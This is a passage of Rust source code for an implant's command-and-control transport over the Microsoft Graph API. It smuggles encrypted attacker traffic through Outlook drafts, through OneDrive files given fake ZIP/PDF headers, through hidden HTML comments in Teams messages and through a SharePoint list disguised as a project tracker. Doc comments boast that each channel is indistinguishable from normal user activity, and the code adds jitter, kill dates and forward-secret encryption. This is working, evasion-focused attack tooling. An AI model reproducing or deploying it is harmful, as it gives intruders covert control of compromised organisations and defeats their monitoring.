            "startswith(subject,'{} - {}')",
            OUTLOOK_SUBJECT_PREFIX, beacon_id
        );
        let path = format!(
            "/me/mailFolders/drafts/messages?$filter={}&$top={}",
            urlencoding::encode(&filter),
            MAX_ITEMS_PER_QUERY
        );

        let mut guard = client.write().await;
        let resp = guard.get(&path).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("failed to list Outlook drafts: HTTP {} — {}", status, body);
        }

        let messages: GraphListResponse<OutlookMessage> = resp.json().await?;
        let mut results = Vec::new();

        for msg in &messages.value {
            if let (Some(id), Some(body)) = (&msg.id, &msg.body) {
                if let Some(content) = &body.content {
                    match decode_email_body(content) {
                        Ok(data) => results.push(data),
                        Err(e) => {
                            tracing::warn!(
                                "graph c2 (outlook): failed to decode draft {}: {}",
                                id,
                                e
                            );
                        }
                    }

                    // Delete the processed draft.
                    if let Err(e) = guard.delete(&format!("/me/messages/{}", id)).await {
                        tracing::warn!("graph c2 (outlook): failed to delete draft {}: {}", id, e);
                    }
                }
            }
        }

        tracing::debug!("graph c2 (outlook): received {} commands", results.len());
        Ok(results)
    }
}

// ── OneDrive Files Channel ───────────────────────────────────────────────────

/// C2 channel using OneDrive file uploads.
///
/// C2 data is encrypted, prepended with a valid file header (ZIP/PDF magic),
/// and uploaded to a OneDrive folder with a legitimate-looking filename.
/// The file appears as a normal Office document to anyone browsing OneDrive.
/// Files are deleted after processing.
///
/// **Traffic pattern**: Periodic GET requests to
/// `graph.microsoft.com/v1.0/me/drive/root:/OrchestraData:/children`
/// (listing files) with occasional PUT (uploading files) and DELETE.
/// This is indistinguishable from a user syncing files with OneDrive.
pub struct OneDriveChannel {
    folder_name: String,
}

impl OneDriveChannel {
    fn new(folder_name: &str) -> Self {
        Self {
            folder_name: folder_name.to_string(),
        }
    }

    /// Ensure the C2 data folder exists in OneDrive.
    async fn ensure_folder(&self, client: &RwLock<GraphClient>) -> Result<()> {
        let path = format!("/me/drive/root:/{}", urlencoding::encode(&self.folder_name));

        let mut guard = client.write().await;
        let resp = guard.get(&path).await?;

        if resp.status().is_success() {
            return Ok(()); // Folder exists.
        }

        // Create the folder.
        let body = serde_json::json!({
            "name": self.folder_name,
            "folder": {},
            "@microsoft.graph.conflictBehavior": "rename"
        });

        let resp = guard
            .post("/me/drive/root/children", &body)
            .await
            .context("failed to create OneDrive folder")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            // Conflict means folder already exists — OK.
            if status.as_u16() == 409 {
                return Ok(());
            }
            bail!(
                "failed to create OneDrive folder: HTTP {} — {}",
                status,
                body
            );
        }

        tracing::debug!("graph c2 (onedrive): created folder '{}'", self.folder_name);
        Ok(())
    }
}

#[async_trait]
impl GraphChannel for OneDriveChannel {
    async fn send_data(
        &self,
        client: &RwLock<GraphClient>,
        data: &[u8],
        _beacon_id: &str,
    ) -> Result<()> {
        self.ensure_folder(client).await?;

        let filename = random_filename();
        let extension = filename.rsplit('.').next().unwrap_or("xlsx");
        let file_data = prepend_file_header(data, extension);

        let upload_path = format!(
            "/me/drive/root:/{}:/{}:/content",
            urlencoding::encode(&self.folder_name),
            urlencoding::encode(&filename)
        );

        let mut guard = client.write().await;
        let resp = guard.put_binary(&upload_path, file_data).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!(
                "failed to upload OneDrive file '{}': HTTP {} — {}",
                filename,
                status,
                body
            );
        }

        tracing::debug!("graph c2 (onedrive): uploaded file '{}'", filename);
        Ok(())
    }

    async fn receive_data(
        &self,
        client: &RwLock<GraphClient>,
        _beacon_id: &str,
    ) -> Result<Vec<Vec<u8>>> {
        let list_path = format!(
            "/me/drive/root:/{}:/children?$top={}",
            urlencoding::encode(&self.folder_name),
            MAX_ITEMS_PER_QUERY
        );

        let mut guard = client.write().await;
        let resp = guard.get(&list_path).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("failed to list OneDrive files: HTTP {} — {}", status, body);
        }

        let items: GraphListResponse<DriveItem> = resp.json().await?;
        let mut results = Vec::new();

        for item in &items.value {
            // Skip folders.
            if item.file.is_none() {
                continue;
            }

            if let (Some(id), Some(name)) = (&item.id, &item.name.as_deref()) {
                // Download the file content.
                let download_path = format!("/me/drive/items/{}/content", id);
                match guard.get(&download_path).await {
                    Ok(dl_resp) => {
                        if dl_resp.status().is_success() {
                            match dl_resp.bytes().await {
                                Ok(bytes) => match strip_file_header(&bytes) {
                                    Ok(data) => results.push(data),
                                    Err(e) => {
                                        tracing::warn!(
                                            "graph c2 (onedrive): failed to strip header from '{}': {}",
                                            name,
                                            e
                                        );
                                    }
                                },
                                Err(e) => {
                                    tracing::warn!(
                                        "graph c2 (onedrive): failed to read file '{}': {}",
                                        name,
                                        e
                                    );
                                }
                            }
                        }
                    }
                    Err(e) => {
                        tracing::warn!(
                            "graph c2 (onedrive): failed to download file '{}': {}",
                            name,
                            e
                        );
                    }
                }

                // Delete the processed file.
                let delete_path = format!("/me/drive/items/{}", id);
                if let Err(e) = guard.delete(&delete_path).await {
                    tracing::warn!("graph c2 (onedrive): failed to delete '{}': {}", name, e);
                }
            }
        }

        tracing::debug!(
            "graph c2 (onedrive): received {} command files",
            results.len()
        );
        Ok(results)
    }
}

// ── Teams Messages Channel ──────────────────────────────────────────────────

/// C2 channel using Microsoft Teams chat messages.
///
/// C2 data is base64-encoded and embedded in an HTML comment within a
/// Teams chat message. The visible message content is a normal Teams
/// conversation. The HTML comment is not displayed in the Teams UI.
///
/// **Traffic pattern**: Periodic GET requests to
/// `graph.microsoft.com/v1.0/chats/<id>/messages` (reading messages)
/// with occasional POST (sending messages). This is indistinguishable
/// from a user chatting in Teams.
pub struct TeamsChannel {
    chat_id: String,
}

impl TeamsChannel {
    fn new(chat_id: &str) -> Self {
        Self {
            chat_id: chat_id.to_string(),
        }
    }
}

#[async_trait]
impl GraphChannel for TeamsChannel {
    async fn send_data(
        &self,
        client: &RwLock<GraphClient>,
        data: &[u8],
        _beacon_id: &str,
    ) -> Result<()> {
        let html_content = encode_teams_message(data);
        let request = TeamsMessageRequest {
            body: TeamsItemBody {
                content_type: Some("html".to_string()),
                content: Some(html_content),
            },
        };

        let path = format!("/chats/{}/messages", self.chat_id);
        let mut guard = client.write().await;
        let resp = guard.post(&path, &request).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("failed to send Teams message: HTTP {} — {}", status, body);
        }

        tracing::debug!("graph c2 (teams): sent message to chat {}", self.chat_id);
        Ok(())
    }

    async fn receive_data(
        &self,
        client: &RwLock<GraphClient>,
        _beacon_id: &str,
    ) -> Result<Vec<Vec<u8>>> {
        let path = format!(
            "/chats/{}/messages?$top={}&$orderby=createdDateTime desc",
            self.chat_id, MAX_ITEMS_PER_QUERY
        );

        let mut guard = client.write().await;
        let resp = guard.get(&path).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("failed to read Teams messages: HTTP {} — {}", status, body);
        }

        let messages: GraphListResponse<TeamsMessage> = resp.json().await?;
        let mut results = Vec::new();
        let mut processed_ids = Vec::new();

        for msg in &messages.value {
            if let (Some(id), Some(body)) = (&msg.id, &msg.body) {
                if let Some(content) = &body.content {
                    // Only process messages with HTML comments.
                    if content.contains("<!-- ") {
                        match decode_teams_message(content) {
                            Ok(data) => {
                                results.push(data);
                                processed_ids.push(id.clone());
                            }
                            Err(e) => {
                                tracing::warn!(
                                    "graph c2 (teams): failed to decode message {}: {}",
                                    id,
                                    e
                                );
                            }
                        }
                    }
                }
            }
        }

        // Note: Teams messages cannot be deleted via Graph API for 1:1 chats.
        // The server-side operator must manage message cleanup.
        // For group chats, messages can be deleted if the app has the
        // ChatMessage.Delete permission.

        tracing::debug!("graph c2 (teams): received {} commands", results.len());
        Ok(results)
    }
}

// ── SharePoint List Channel ─────────────────────────────────────────────────

/// C2 channel using a SharePoint list as a command queue.
///
/// A SharePoint list is created that looks like a project tracker.
/// Each row represents a C2 message:
/// - "Title" column: message ID / sequence number
/// - "Description" column: base64-encoded encrypted C2 data
/// - "Status" column: "new" (pending) → "processed" (acknowledged)
///
/// **Traffic pattern**: Periodic GET requests to
/// `graph.microsoft.com/v1.0/sites/<id>/lists/<id>/items`
/// (reading list items) with occasional POST (adding items) and PATCH
/// (updating status). This is indistinguishable from a user interacting
/// with a SharePoint project tracker.
pub struct SharePointChannel {
    site_id: String,
    list_id: Option<String>,
}

impl SharePointChannel {
    fn new(site_id: &str, list_id: Option<&str>) -> Self {
        Self {
            site_id: site_id.to_string(),
            list_id: list_id.map(|s| s.to_string()),
        }
    }

    /// Ensure the C2 list exists in SharePoint.
    async fn ensure_list(&mut self, client: &RwLock<GraphClient>) -> Result<String> {
        if let Some(ref lid) = self.list_id {
            return Ok(lid.clone());
        }

        let list_name = format!("ProjectTracker_{}", rand::thread_rng().gen_range(100..999));

        let request = CreateSpListRequest {
            display_name: list_name.clone(),
            description: SP_LIST_DESCRIPTION.to_string(),
            columns: vec![
                SpColumn {
                    name: "description".to_string(),
                    text_type: SpColumnText {
                        max_length: Some(32000),
                    },
                },
                SpColumn {
                    name: "status".to_string(),
                    text_type: SpColumnText {
                        max_length: Some(50),
                    },
                },
            ],
        };

        let path = format!("/sites/{}/lists", self.site_id);
        let mut guard = client.write().await;
        let resp = guard.post(&path, &request).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!(
                "failed to create SharePoint list: HTTP {} — {}",
                status,
                body
            );
        }

        let list: SharePointList = resp.json().await?;
        let list_id = list
            .id
            .ok_or_else(|| anyhow!("SharePoint list creation response missing id"))?;

        self.list_id = Some(list_id.clone());
        tracing::debug!(
            "graph c2 (sharepoint): created list '{}' ({})",
            list_name,
            list_id
        );
        Ok(list_id)
    }
}

#[async_trait]
impl GraphChannel for SharePointChannel {
    async fn send_data(
        &self,
        client: &RwLock<GraphClient>,
        data: &[u8],
        beacon_id: &str,
    ) -> Result<()> {
        let list_id = self
            .list_id
            .as_ref()
            .ok_or_else(|| anyhow!("SharePoint list ID not initialized"))?;

        let b64_data = base64::engine::general_purpose::STANDARD.encode(data);
        let request = CreateSpItemRequest {
            fields: CreateSpFields {
                title: beacon_id.to_string(),
                description: b64_data,
                status: "new".to_string(),
            },
        };

        let path = format!("/sites/{}/lists/{}/items", self.site_id, list_id);
        let mut guard = client.write().await;
        let resp = guard.post(&path, &request).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!(
                "failed to create SharePoint item: HTTP {} — {}",
                status,
                body
            );
        }

        tracing::debug!(
            "graph c2 (sharepoint): created item for beacon '{}'",
            beacon_id
        );
        Ok(())
    }

    async fn receive_data(
        &self,
        client: &RwLock<GraphClient>,
        beacon_id: &str,
    ) -> Result<Vec<Vec<u8>>> {
        let list_id = self
            .list_id
            .as_ref()
            .ok_or_else(|| anyhow!("SharePoint list ID not initialized"))?;

        let filter = format!("fields/Title eq '{}' and fields/Status eq 'new'", beacon_id);
        let path = format!(
            "/sites/{}/lists/{}/items?$expand=fields&$filter={}&$top={}",
            self.site_id,
            list_id,
            urlencoding::encode(&filter),
            MAX_ITEMS_PER_QUERY
        );

        let mut guard = client.write().await;
        let resp = guard.get(&path).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!(
                "failed to query SharePoint items: HTTP {} — {}",
                status,
                body
            );
        }

        let items: GraphListResponse<SharePointListItem> = resp.json().await?;
        let mut results = Vec::new();

        for item in &items.value {
            if let (Some(id), Some(fields)) = (&item.id, &item.fields) {
                if let Some(description) = &fields.description {
                    match base64::engine::general_purpose::STANDARD.decode(description) {
                        Ok(data) => results.push(data),
                        Err(e) => {
                            tracing::warn!(
                                "graph c2 (sharepoint): failed to decode item {}: {}",
                                id,
                                e
                            );
                        }
                    }

                    // Mark item as processed.
                    let update_path = format!(
                        "/sites/{}/lists/{}/items/{}/fields",
                        self.site_id, list_id, id
                    );
                    let update = UpdateSpFields {
                        status: "processed".to_string(),
                    };
                    if let Err(e) = guard.patch(&update_path, &update).await {
                        tracing::warn!(
                            "graph c2 (sharepoint): failed to mark item {} as processed: {}",
                            id,
                            e
                        );
                    }
                }
            }
        }

        tracing::debug!("graph c2 (sharepoint): received {} commands", results.len());
        Ok(results)
    }
}

// ── Graph Transport ──────────────────────────────────────────────────────────

/// Microsoft Graph API C2 transport.
///
/// Implements the [`Transport`] trait using Microsoft Graph API as the
/// underlying transport. All C2 data is encrypted with [`CryptoSession`]
/// before being encoded into the selected Graph channel.
///
/// # Usage
///
/// ```ignore
/// use agent::c2_graph::{GraphTransport, GraphC2Config};
/// use common::CryptoSession;
///
/// let config = GraphC2Config {
///     enabled: true,
///     channel: "onedrive".to_string(),
///     client_id: "...".to_string(),
///     tenant_id: "...".to_string(),
///     access_token: "...".to_string(),
///     ..Default::default()
/// };
///
/// let session = CryptoSession::from_shared_secret(b"pre-shared-key");
/// let transport = GraphTransport::new(config, session, "agent-001".to_string())?;
/// ```
pub struct GraphTransport {
    /// Authenticated Graph API client.
    client: RwLock<GraphClient>,
    /// Crypto session for encrypting/decrypting C2 data.
    session: CryptoSession,
    /// HIGH-001: ECDH forward-secrecy state. `Some` while the ECDH handshake
    /// is in progress. Set to `None` once the session key has been derived
    /// from the ECDH exchange. If `psk` is empty, this stays `None` (no
    /// forward secrecy upgrade).
    ecdh_client: Option<std::sync::Mutex<common::forward_secrecy::HttpEcdhClient>>,
    /// Agent identifier (beacon ID for channel addressing).
    agent_id: String,
    /// Configuration.
    config: GraphC2Config,
    /// The active data channel (Outlook, OneDrive, Teams, or SharePoint).
    channel: Box<dyn GraphChannel>,
    /// Last polling timestamp (for jitter enforcement).
    last_poll: std::sync::Mutex<Instant>,
}

impl GraphTransport {
    /// Create a new Graph API C2 transport.
    pub fn new(config: GraphC2Config, session: CryptoSession, agent_id: String) -> Result<Self> {
        if !config.enabled {
            bail!("graph c2 transport is not enabled in config");
        }

        let client = GraphClient::from_access_token(
            &config.access_token,
            config.refresh_token.as_deref(),
            &config.client_id,
            &config.tenant_id,
            3600, // Assume 1 hour until first refresh
            config.government_cloud,
            config.custom_graph_url.as_deref(),
        );

        let channel: Box<dyn GraphChannel> = match config.channel.as_str() {
            "outlook" => Box::new(OutlookChannel),
            "onedrive" => Box::new(OneDriveChannel::new(&config.beacon_folder)),
            "teams" => {
                let chat_id = config
                    .teams_chat_id
                    .as_deref()
                    .ok_or_else(|| anyhow!("teams_chat_id is required for Teams channel"))?;
                Box::new(TeamsChannel::new(chat_id))
            }
            "sharepoint" => {
                let site_id = config.sharepoint_site_id.as_deref().ok_or_else(|| {
                    anyhow!("sharepoint_site_id is required for SharePoint channel")
                })?;
                Box::new(SharePointChannel::new(
                    site_id,
                    config.sharepoint_list_id.as_deref(),
                ))
            }
            _ => bail!(
                "unknown Graph channel '{}'; expected: outlook, onedrive, teams, sharepoint",
                config.channel
            ),
        };

        // HIGH-001: initialise ECDH forward-secrecy client if a PSK is
        // configured.  The ECDH handshake piggybacks on the normal send/recv
        // cycle — no extra round-trip is needed.
        let ecdh_client = if !config.psk.is_empty() {
            Some(std::sync::Mutex::new(
                common::forward_secrecy::HttpEcdhClient::new(config.psk.as_bytes()),
            ))
        } else {
            None
        };

        Ok(Self {
            client: RwLock::new(client),
            session,
            ecdh_client,
            agent_id,
            config,
            channel,
            last_poll: std::sync::Mutex::new(Instant::now()),
        })
    }

    /// Apply jitter to the polling interval.
    ///
    /// Waits for the configured polling interval with random jitter
    /// from the malleable profile, then returns.
    async fn apply_jitter(&self) {
        let base = self.config.polling_interval_secs;
        // Apply ±20% jitter.
        // Compute the sleep duration BEFORE the await so ThreadRng
        // is dropped before the future needs to be Send.
        let sleep_dur = {
            let mut rng = rand::thread_rng();
            let jitter_pct: f64 = rng.gen_range(0.8..1.2);
            let sleep_secs = (base as f64 * jitter_pct) as u64;
            Duration::from_secs(sleep_secs.max(5)) // Minimum 5 seconds.
        };

        tokio::time::sleep(sleep_dur).await;
    }
}

#[async_trait]
impl Transport for GraphTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        tracing::debug!("graph c2: send (channel = {})", self.config.channel);

        // CRIT-005: enforce kill date before every send.
        if !self.config.kill_date.is_empty() {
            crate::config::check_kill_date(&self.config.kill_date)?;
        }

        // Serialize and encrypt the message.
        let serialized = bincode::serde::encode_to_vec(&msg, bincode::config::legacy())
            .context("failed to serialize message for Graph transport")?;
        let ciphertext = self.session.encrypt(&serialized);

        // HIGH-001: prepend ECDH forward-secrecy init frame if handshake
        // is still in progress.  The server will respond with its own ECDH
        // data in a matching frame (handled in recv).
        let outbound = if let Some(ref ecdh) = self.ecdh_client {
            let header_b64 = ecdh.lock_recover().header_value();
            let mut framed = common::forward_secrecy::encode_ecdh_bin_frame(&header_b64);
            framed.extend_from_slice(&ciphertext);
            framed
        } else {
            ciphertext
        };

        // Send through the active channel.
        self.channel
            .send_data(&self.client, &outbound, &self.agent_id)
            .await?;

        Ok(())
    }

    async fn recv(&mut self) -> Result<Message> {
        tracing::debug!("graph c2: recv (channel = {})", self.config.channel);

        // CRIT-005: enforce kill date before every recv.
        if !self.config.kill_date.is_empty() {
            crate::config::check_kill_date(&self.config.kill_date)?;
        }

        // Apply jitter before polling.
        self.apply_jitter().await;

        // Receive encrypted data from the channel.
        let encrypted_chunks = self
            .channel
            .receive_data(&self.client, &self.agent_id)
            .await?;

        // Try to decrypt each chunk and deserialize to a Message.
        for chunk in encrypted_chunks {
            // HIGH-001: check for ECDH forward-secrecy frame from server.
            // If present, derive the new session key and decrypt the rest.
            let ciphertext = if let Some(ref mut ecdh) = self.ecdh_client {
                if let Some((ecdh_b64, remaining)) =
                    common::forward_secrecy::try_extract_ecdh_bin_frame(&chunk)
                {
                    let mut client = ecdh.lock_recover();
                    match client.derive_session_from_response(&ecdh_b64) {
                        Ok(new_session) => {
                            tracing::info!(
                                "graph c2: ECDH handshake completed — forward-secrecy session established"
                            );
                            self.session = new_session;
                            drop(client);
                            self.ecdh_client = None;
                        }
                        Err(e) => {
                            tracing::warn!(
                                "graph c2: ECDH handshake failed: {e}; keeping PSK-derived session"
                            );
                        }
                    }
                    remaining
                } else {
                    &chunk[..]
                }
            } else {
                &chunk[..]
            };

            match self.session.decrypt(ciphertext) {
                Ok(plaintext) => {
                    match bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy())
                        .map(|(v, _)| v)
                    {
                        Ok(msg) => return Ok(msg),
                        Err(e) => {
                            tracing::warn!("graph c2: failed to deserialize message: {}", e);
                        }
                    }
                }
                Err(e) => {
                    tracing::warn!("graph c2: failed to decrypt chunk: {}", e);
                }
            }
        }

        // No valid message received this cycle — return a Heartbeat
        // to keep the transport loop alive.
        let heartbeat = Message::Heartbeat {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            agent_id: self.agent_id.clone(),
            status: "polling".to_string(),
            mesh_public_key: None,
        };
        Ok(heartbeat)
    }
}

// ── Unit Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Test that email body encoding/decoding roundtrips correctly.
    #[test]
    fn test_email_body_roundtrip() {
        let original = b"Hello, this is C2 test data with various bytes: \x00\x01\x02\xff";
        let beacon_id = "test-agent-001";

        let html = encode_email_body(original, beacon_id);
        assert!(html.contains("<table"));
        assert!(html.contains(beacon_id));

        let decoded = decode_email_body(&html).expect("decode should succeed");
        assert_eq!(decoded, original);
    }

    /// Test that file header prepend/strip roundtrips correctly.
    #[test]
    fn test_file_header_roundtrip_zip() {
        let original = vec![0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE];
        let with_header = prepend_file_header(&original, "xlsx");
        assert!(with_header.starts_with(b"PK\x03\x04")); // ZIP magic.

        let stripped = strip_file_header(&with_header).expect("strip should succeed");
        assert_eq!(stripped, original);
    }

    /// Test that file header prepend/strip roundtrips for PDF.
    #[test]
    fn test_file_header_roundtrip_pdf() {
        let original = b"encrypted payload data here".to_vec();
        let with_header = prepend_file_header(&original, "pdf");
        assert!(with_header.starts_with(b"%PDF")); // PDF magic.

        let stripped = strip_file_header(&with_header).expect("strip should succeed");
        assert_eq!(stripped, original);
    }

    /// Test Teams message encoding/decoding roundtrip.
    #[test]
    fn test_teams_message_roundtrip() {
        let original = b"Teams C2 test data: \x00\x01\x02\xff\xfe\xfd";
        let html = encode_teams_message(original);

        assert!(html.contains("<!-- "));
        assert!(html.contains(" -->"));
        assert!(html.contains("<p>Hey")); // Visible text.

        let decoded = decode_teams_message(&html).expect("decode should succeed");
        assert_eq!(decoded, original);
    }

    /// Test that random filenames look legitimate.
    #[test]
    fn test_random_filename_format() {
        let name = random_filename();
        assert!(name.contains('_'));
        assert!(name.contains('.'));
        let ext = name.rsplit('.').next().unwrap();
        assert!(FILE_EXTENSIONS.contains(&ext));
    }

    /// Test config defaults.
    #[test]
    fn test_config_defaults() {
        let config = GraphC2Config::default();
        assert!(!config.enabled);
        assert_eq!(config.channel, "onedrive");
        assert_eq!(config.beacon_folder, DEFAULT_BEACON_FOLDER);
        assert_eq!(config.polling_interval_secs, DEFAULT_POLLING_INTERVAL_SECS);
        assert!(!config.government_cloud);
        assert_eq!(config.max_file_size_bytes, 4 * 1024 * 1024);
    }

    /// Test that the GraphClient uses the correct base URLs.
    #[test]
    fn test_graph_client_urls() {
        let commercial = GraphClient::from_access_token(
            "test-token",
            None,
            "client",
            "tenant",
            3600,
            false,
            None,
        );
        assert_eq!(commercial.graph_base_url(), GRAPH_BASE_URL);

        let gov = GraphClient::from_access_token(
            "test-token",
            None,
            "client",
            "tenant",
            3600,
            true,
            None,
        );
        assert_eq!(gov.graph_base_url(), GRAPH_GOV_BASE_URL);

        let custom = GraphClient::from_access_token(
            "test-token",
            None,
            "client",
            "tenant",
            3600,
            false,
            Some("http://localhost:8080/test"),
        );
        assert_eq!(custom.graph_base_url(), "http://localhost:8080/test");
    }

    /// Test file header with empty data.
    #[test]
    fn test_file_header_empty_data() {
        let original = vec![];
        let with_header = prepend_file_header(&original, "xlsx");
        let stripped = strip_file_header(&with_header).expect("strip should succeed");
        assert!(stripped.is_empty());
    }

    /// Test strip_file_header with unknown header falls through.
    #[test]
    fn test_strip_unknown_header() {
        let data = b"raw data without header".to_vec();
        let stripped = strip_file_header(&data).expect("should return data as-is");
        assert_eq!(stripped, data);
    }
}
